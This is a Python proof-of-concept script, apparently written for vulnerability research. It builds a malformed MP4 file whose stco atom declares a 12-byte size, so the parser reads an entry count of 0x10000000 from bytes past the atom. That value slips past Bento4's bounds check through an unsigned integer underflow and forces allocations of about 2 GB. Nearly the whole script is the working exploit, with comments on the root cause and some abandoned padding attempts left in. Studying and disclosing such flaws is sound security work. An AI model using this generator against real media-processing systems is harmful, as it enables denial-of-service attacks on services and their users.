#!/usr/bin/env python3
"""
PoC generator for VULN 003: AP4_StcoAtom Unsigned Integer Underflow -> OOM/DoS
CWE: CWE-191 -> CWE-789

Root cause (Ap4StcoAtom.cpp lines 78-82):
  stream.ReadUI32(m_EntryCount);
  if (m_EntryCount > (size-AP4_FULL_ATOM_HEADER_SIZE-4)/4) {
      m_EntryCount = (size-AP4_FULL_ATOM_HEADER_SIZE-4)/4;
  }
  m_Entries = new AP4_UI32[m_EntryCount];

  With AP4_FULL_ATOM_HEADER_SIZE=12, when size=12 (minimum valid full-atom):
    (12 - 12 - 4) = 0 - 4 in uint32 = 0xFFFFFFFC (UNSIGNED UNDERFLOW)
    0xFFFFFFFC / 4 = 0x3FFFFFFF

  So any entry_count <= 0x3FFFFFFF passes the bounds check unmodified.
  With entry_count=0x10000000, new AP4_UI32[0x10000000] allocates ~1GB.

Trigger construction:
  - stco atom size=12 (just the 12-byte full atom header, no declared payload)
  - 4 bytes AFTER the 12-byte stco declaration: 0x10000000 (read as entry_count)
    These bytes are placed inside stbl's payload but beyond stco's declared end.
    The atom factory reads stco size+type (8 bytes) first, then Create() reads
    version+flags (4 bytes), total 12 bytes consumed = stco's declared end.
    The constructor's ReadUI32(m_EntryCount) reads 4 MORE bytes from stream.
  - Those 4 bytes = 0x10000000 -> entry_count bypasses bounds check
  - new AP4_UI32[0x10000000] + new unsigned char[0x40000000] -> ~2GB allocation
"""

import struct
import os

def box(type4, data=b''):
    return struct.pack('>I', 4 + 4 + len(data)) + type4 + data

def fullbox(type4, version, flags, data=b''):
    hdr = struct.pack('>I', (version << 24) | (flags & 0xFFFFFF))
    return box(type4, hdr + data)

# --- ftyp ---
ftyp_data = (
    b'isom'
    + struct.pack('>I', 0x00000200)
    + b'isom'
    + b'iso2'
    + b'mp41'
)
ftyp = box(b'ftyp', ftyp_data)

# --- mvhd (version 0) ---
mvhd_payload = (
    struct.pack('>I', 0)             # creation_time
    + struct.pack('>I', 0)           # modification_time
    + struct.pack('>I', 1000)        # timescale
    + struct.pack('>I', 0)           # duration
    + struct.pack('>I', 0x00010000)  # rate (1.0)
    + struct.pack('>H', 0x0100)      # volume (1.0)
    + b'\x00' * 10                   # reserved
    + struct.pack('>9i', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
    + b'\x00' * 24                   # pre_defined
    + struct.pack('>I', 2)           # next_track_ID
)
mvhd = fullbox(b'mvhd', 0, 0, mvhd_payload)

# --- tkhd (version 0) ---
tkhd_payload = (
    struct.pack('>I', 0)       # creation_time
    + struct.pack('>I', 0)     # modification_time
    + struct.pack('>I', 1)     # track_ID
    + struct.pack('>I', 0)     # reserved
    + struct.pack('>I', 0)     # duration
    + b'\x00' * 8              # reserved
    + struct.pack('>H', 0)     # layer
    + struct.pack('>H', 1)     # alternate_group
    + struct.pack('>H', 0x0100)# volume
    + b'\x00' * 2              # reserved
    + struct.pack('>9i', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
    + struct.pack('>I', 0)     # width
    + struct.pack('>I', 0)     # height
)
tkhd = fullbox(b'tkhd', 0, 3, tkhd_payload)

# --- mdhd (version 0) ---
mdhd_payload = (
    struct.pack('>I', 0)       # creation_time
    + struct.pack('>I', 0)     # modification_time
    + struct.pack('>I', 44100) # timescale
    + struct.pack('>I', 0)     # duration
    + struct.pack('>H', 0x55C4)# language (und)
    + struct.pack('>H', 0)     # pre_defined
)
mdhd = fullbox(b'mdhd', 0, 0, mdhd_payload)

# --- hdlr ---
hdlr_payload = (
    struct.pack('>I', 0)       # pre_defined
    + b'soun'                  # handler_type
    + b'\x00' * 12             # reserved
    + b'SoundHandler\x00'      # name
)
hdlr = fullbox(b'hdlr', 0, 0, hdlr_payload)

# --- smhd ---
smhd_payload = struct.pack('>H', 0) + struct.pack('>H', 0)
smhd = fullbox(b'smhd', 0, 0, smhd_payload)

# --- dref ---
url_entry = fullbox(b'url ', 0, 1, b'')
dref_payload = struct.pack('>I', 1) + url_entry
dref = fullbox(b'dref', 0, 0, dref_payload)

# --- dinf ---
dinf = box(b'dinf', dref)

# --- stsd ---
mp4a_payload = (
    b'\x00' * 6
    + struct.pack('>H', 1)
    + b'\x00' * 8
    + struct.pack('>H', 2)
    + struct.pack('>H', 16)
    + struct.pack('>H', 0)
    + struct.pack('>H', 0)
    + struct.pack('>I', 44100 << 16)
)
mp4a = box(b'mp4a', mp4a_payload)
stsd_payload = struct.pack('>I', 1) + mp4a
stsd = fullbox(b'stsd', 0, 0, stsd_payload)

# --- stts ---
stts = fullbox(b'stts', 0, 0, struct.pack('>I', 0))

# --- stsc ---
stsc = fullbox(b'stsc', 0, 0, struct.pack('>I', 0))

# --- stsz ---
stsz = fullbox(b'stsz', 0, 0, struct.pack('>II', 0, 0))

# --- THE MALICIOUS stco atom (size=12, no payload) ---
# size=12: 4(size) + 4(type) + 4(version+flags) = 12 bytes, NO entry_count field
# The atom factory reads SIZE+TYPE (8 bytes), then Create() reads VERSION+FLAGS (4 bytes)
# = 12 bytes total. The constructor then reads entry_count from the NEXT 4 bytes in stream.
# Those next 4 bytes are OUTSIDE this stco's declared size, but inside stbl's payload.

MALICIOUS_ENTRY_COUNT = 0x10000000  # 268435456

# stco raw: 12 bytes (just the full atom header)
# struct: size(4) + type(4) + version+flags(4) = 12
stco_raw = struct.pack('>I', 12) + b'stco' + struct.pack('>I', 0)
assert len(stco_raw) == 12

# Bytes immediately following stco_raw inside stbl's payload.
# These 4 bytes are read by stco's constructor as entry_count.
# Value 0x10000000 bypasses the underflow bounds check:
#   (12 - 12 - 4) / 4 = 0xFFFFFFFC / 4 = 0x3FFFFFFF (UNDERFLOW!)
#   0x10000000 > 0x3FFFFFFF? NO -> entry_count stays 0x10000000
# Then: new AP4_UI32[0x10000000] -> 1GB allocation
#       new unsigned char[0x40000000]  -> 1GB allocation
extra_bytes = struct.pack('>I', MALICIOUS_ENTRY_COUNT)  # 4 bytes read as entry_count
# 4 more bytes to prevent the factory from seeking way out of bounds:
# After stco is processed, factory seeks to stco_start+12, then tries to parse next atom.
# These 4 bytes would be read as SIZE of next atom. Using 0x00000008 for an 8-byte null atom.
extra_bytes += struct.pack('>I', 8)  # SIZE=8 for the "fake" next box
# But we DON'T add a TYPE for this fake box in the file since stbl will be declared exactly.
# The 8 bytes (4+4) will be the "next child" attempt by the factory after stco.

# Actually: let's include just the 4 bytes of entry_count and 4 bytes of a minimal box header
# The factory after processing stco (12 bytes) seeks to stco_start+12, then reads
# SIZE=0x10000000 as the next child -> tries to create a 268MB atom -> fails (seek error).
# So really we just need those first 4 bytes = 0x10000000.
# The next 4 bytes don't matter much. Let's use a valid-looking small box size.
# Actually scrap the extra_bytes padding - just 4 bytes is enough.
extra_bytes = struct.pack('>I', MALICIOUS_ENTRY_COUNT)

# The total stco region in stbl = 12 (stco_raw) + 4 (extra_bytes read as entry_count)
# = 16 bytes, but stco's DECLARED size is only 12.
# stbl's content includes both stco_raw (12) and extra_bytes (4) as raw bytes,
# because stbl's declared size will account for them.
# This is legal from a container perspective: stbl has 16 bytes allocated for stco+extra,
# but stco only declares it uses 12 of them. The extra 4 bytes are "inside stbl" but
# "outside stco's declared boundary". The atom factory after stco would try to parse
# those 4 bytes as another atom header (needing at least 8 bytes = size+type, but we
# only have 4). So the factory would fail to parse it and stop.
# That's fine for our purposes - the damage (OOM attempt) is done during stco parsing.

# --- Build stbl ---
# NOTE: We include the 4 extra_bytes as part of stbl's children area.
# The factory will try to parse those 4 bytes as a child after stco, fail, and stop.
stbl_payload = stsd + stts + stsc + stsz + stco_raw + extra_bytes
stbl = box(b'stbl', stbl_payload)

# --- minf ---
minf = box(b'minf', smhd + dinf + stbl)

# --- mdia ---
mdia = box(b'mdia', mdhd + hdlr + minf)

# --- trak ---
trak = box(b'trak', tkhd + mdia)

# --- moov ---
moov = box(b'moov', mvhd + trak)

# --- Complete MP4 ---
mp4_data = ftyp + moov

# Write to file
out_dir = os.path.dirname(os.path.abspath(__file__))
out_path = os.path.join(out_dir, 'vuln_003.mp4')
with open(out_path, 'wb') as f:
    f.write(mp4_data)

print(f"Written {len(mp4_data)} bytes to {out_path}")
print(f"stco declared size: 12 (no payload room)")
print(f"Bytes at stco+12 (read as entry_count): 0x{MALICIOUS_ENTRY_COUNT:08X} = {MALICIOUS_ENTRY_COUNT}")
print(f"Underflow check: (12-12-4)/4 = 0x3FFFFFFF (UNSIGNED UNDERFLOW)")
print(f"Bypass: {MALICIOUS_ENTRY_COUNT} <= 0x3FFFFFFF -> entry_count NOT clamped")
print(f"Attempted allocations:")
print(f"  new AP4_UI32[0x{MALICIOUS_ENTRY_COUNT:X}] = {MALICIOUS_ENTRY_COUNT * 4 / (1024**3):.2f} GB")
print(f"  new unsigned char[0x{MALICIOUS_ENTRY_COUNT * 4:X}] = {MALICIOUS_ENTRY_COUNT * 4 / (1024**3):.2f} GB")
print(f"  Total attempted: ~{MALICIOUS_ENTRY_COUNT * 8 / (1024**3):.2f} GB")
